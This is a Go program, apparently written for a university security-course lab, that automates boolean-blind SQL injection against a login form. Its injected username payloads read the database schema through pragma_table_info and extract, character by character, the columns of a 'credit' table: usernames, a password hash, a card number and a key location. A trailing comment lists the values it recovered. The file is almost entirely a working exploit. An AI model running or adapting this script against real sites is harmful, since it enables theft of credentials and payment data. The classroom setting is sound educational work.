package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"strings"
)

const baseURL = "http://cs177.seclab.cs.ucsb.edu:61964/login"

// Helper function to validate and process response
func validateResponse(body []byte) bool {
	length := len(body)
	fmt.Printf("Response length: %d\n", length)

	// If response indicates failure (less than 3000 chars), print the body
	if length < 3000 {
		fmt.Println("Response body:")
		fmt.Println(string(body))
		return false
	}
	fmt.Println("Successful login")
	return true
}

func testColumnName(position int, charPosition int, char string) bool {
	// Test if the character at charPosition in the column name at position matches char
	payload := fmt.Sprintf("cs177' AND (SELECT substr(name,%d,1) FROM pragma_table_info('credit') LIMIT 1 OFFSET %d)='%s'; --",
		charPosition, position, char)

	params := url.Values{}
	params.Add("username", payload)
	params.Add("password", "anything")
	params.Add("login", "Login")

	fullURL := fmt.Sprintf("%s?%s", baseURL, params.Encode())

	resp, err := http.Get(fullURL)
	if err != nil {
		fmt.Printf("Error making request: %v\n", err)
		return false
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Printf("Error reading response: %v\n", err)
		return false
	}

	return len(body) > 3000
}

func testTableStructure() {
	// Possible characters in column names
	chars := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_$"

	// Try each column position (0-6)
	for pos := 0; pos < 7; pos++ {
		columnName := []string{}
		fmt.Printf("Finding column %d: ", pos)

		// Try up to 20 characters per column name
		for charPos := 1; charPos <= 20; charPos++ {
			found := false
			for _, char := range chars {
				if testColumnName(pos, charPos, string(char)) {
					columnName = append(columnName, string(char))
					fmt.Printf("%c", char)
					found = true
					break
				}
			}
			// If no character matched, we've reached the end of the column name
			if !found {
				break
			}
		}
		fmt.Println()
	}
}

func testColumn(columnName string, position int, char string, rowOffset int) bool {
	// Test each character of the specified column value for a specific row
	payload := fmt.Sprintf("cs177' AND (SELECT substr(%s,%d,1) FROM credit LIMIT 1 OFFSET %d)='%s'; --",
		columnName, position, rowOffset, char)

	params := url.Values{}
	params.Add("username", payload)
	params.Add("password", "anything")
	params.Add("login", "Login")

	fullURL := fmt.Sprintf("%s?%s", baseURL, params.Encode())

	resp, err := http.Get(fullURL)
	if err != nil {
		fmt.Printf("Error making request: %v\n", err)
		return false
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Printf("Error reading response: %v\n", err)
		return false
	}

	return len(body) > 3000
}

func extractColumnValue(columnName string, rowOffset int) string {
	// Possible characters - including special chars that might be in the flag
	chars := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789/._-{}!@#$%^&*()=+[]<>?,\\| '"

	value := []string{}
	fmt.Printf("Row %d - Finding %s value: ", rowOffset, columnName)

	questionCount := 0
	// Try up to 50 characters
	for pos := 1; pos <= 50; pos++ {
		found := false
		for _, char := range chars {
			if testColumn(columnName, pos, string(char), rowOffset) {
				value = append(value, string(char))
				fmt.Printf("%c", char)
				found = true
				questionCount = 0
				break
			}
		}
		// If no character matched, print space and increment counter
		if !found {
			fmt.Printf(" ")
			questionCount++
			if questionCount >= 5 {
				break
			}
		}
	}
	fmt.Println()
	return strings.Join(value, "")
}

func testPasswordHash(position int, char string) bool {
	// Test each character of the password hash
	payload := fmt.Sprintf("cs177' AND (SELECT substr(passwd_sha,%d,1) FROM credit WHERE uname='cs177')='%s'; --",
		position, char)

	params := url.Values{}
	params.Add("username", payload)
	params.Add("password", "anything")
	params.Add("login", "Login")

	fullURL := fmt.Sprintf("%s?%s", baseURL, params.Encode())

	resp, err := http.Get(fullURL)
	if err != nil {
		fmt.Printf("Error making request: %v\n", err)
		return false
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Printf("Error reading response: %v\n", err)
		return false
	}

	return len(body) > 3000
}

func extractPasswordHash() {
	// Only hex characters for SHA hash
	chars := "0123456789abcdef"

	hash := []string{}
	fmt.Printf("Finding password hash: ")

	// SHA hash is 64 characters
	for pos := 1; pos <= 64; pos++ {
		found := false
		for _, char := range chars {
			if testPasswordHash(pos, string(char)) {
				hash = append(hash, string(char))
				fmt.Printf("%c", char)
				found = true
				break
			}
		}
		// If no character matched, we've reached the end
		if !found {
			break
		}
	}
	fmt.Println()
}

func testKeyLocation(position int, char string) bool {
	// Test each character of the master_key_loc value
	payload := fmt.Sprintf("cs177' AND (SELECT substr(master_key_loc,%d,1) FROM credit WHERE uname='cs177')='%s'; --",
		position, char)

	params := url.Values{}
	params.Add("username", payload)
	params.Add("password", "anything")
	params.Add("login", "Login")

	fullURL := fmt.Sprintf("%s?%s", baseURL, params.Encode())

	resp, err := http.Get(fullURL)
	if err != nil {
		fmt.Printf("Error making request: %v\n", err)
		return false
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Printf("Error reading response: %v\n", err)
		return false
	}

	return len(body) > 3000
}

func extractKeyLocation() {
	// Expanded character set
	chars := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789/._-{}!@#$%^&*()=+[]<>?,\\| "

	location := []string{}
	fmt.Printf("Finding master_key_loc value: ")

	// Try exactly 20 characters
	for pos := 1; pos <= 20; pos++ {
		found := false
		for _, char := range chars {
			if testKeyLocation(pos, string(char)) {
				location = append(location, string(char))
				fmt.Printf("%c", char)
				found = true
				break
			}
		}
		// If no character matched for this position, print a placeholder
		if !found {
			fmt.Printf("?")
		}
	}
	fmt.Println()
}

/*
Finding column 0: uname
Finding column 1: passwd_sha256
Finding column 2: card_no
Finding column 3: ty
Finding column 4: nom
Finding column 5: dt
Finding column 6: master_key_loc

---
Finding uname value: cs177
Finding passwd_sha256 value: fdbfbb7d9c5cbe7cdb672f5a319220160e33f7dc895b0001d7
Finding card_no value: 7868833920019604
Finding ty value: amex
Finding nom value: cs177
Finding dt value: 3856871
Finding master_key_loc value: You
---

*/

func main() {
	// Check each column for each row
	columns := []string{"uname", "passwd_sha256", "card_no", "ty", "nom", "dt", "master_key_loc"}

	for row := 0; row < 7; row++ {
		fmt.Printf("\nExtracting data from row %d:\n", row)
		for _, col := range columns {
			extractColumnValue(col, row)
		}
	}
}

func testKeyLength(length int) bool {
	// Test if master_key_loc is of specific length
	payload := fmt.Sprintf("cs177' AND (SELECT length(master_key_loc) FROM credit WHERE uname='cs177')=%d; --",
		length)

	params := url.Values{}
	params.Add("username", payload)
	params.Add("password", "anything")
	params.Add("login", "Login")

	fullURL := fmt.Sprintf("%s?%s", baseURL, params.Encode())

	resp, err := http.Get(fullURL)
	if err != nil {
		fmt.Printf("Error making request: %v\n", err)
		return false
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Printf("Error reading response: %v\n", err)
		return false
	}

	return len(body) > 3000
}

func findKeyLength() {
	fmt.Printf("Finding master_key_loc length: ")
	// Try lengths up to 100 (adjust if needed)
	for length := 1; length <= 100; length++ {
		if testKeyLength(length) {
			fmt.Printf("%d\n", length)
			return
		}
	}
	fmt.Println("Length not found in range 1-100")
}

func testRowCount(count int) bool {
	// Test if the total number of rows matches count
	payload := fmt.Sprintf("cs177' AND (SELECT count(*) FROM credit)=%d; --",
		count)

	params := url.Values{}
	params.Add("username", payload)
	params.Add("password", "anything")
	params.Add("login", "Login")

	fullURL := fmt.Sprintf("%s?%s", baseURL, params.Encode())

	resp, err := http.Get(fullURL)
	if err != nil {
		fmt.Printf("Error making request: %v\n", err)
		return false
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Printf("Error reading response: %v\n", err)
		return false
	}

	return len(body) > 3000
}

func findRowCount() {
	fmt.Printf("Finding number of rows: ")
	// Try counts up to 100 (adjust if needed)
	for count := 1; count <= 100; count++ {
		if testRowCount(count) {
			fmt.Printf("%d\n", count)
			return
		}
	}
	fmt.Println("Count not found in range 1-100")
}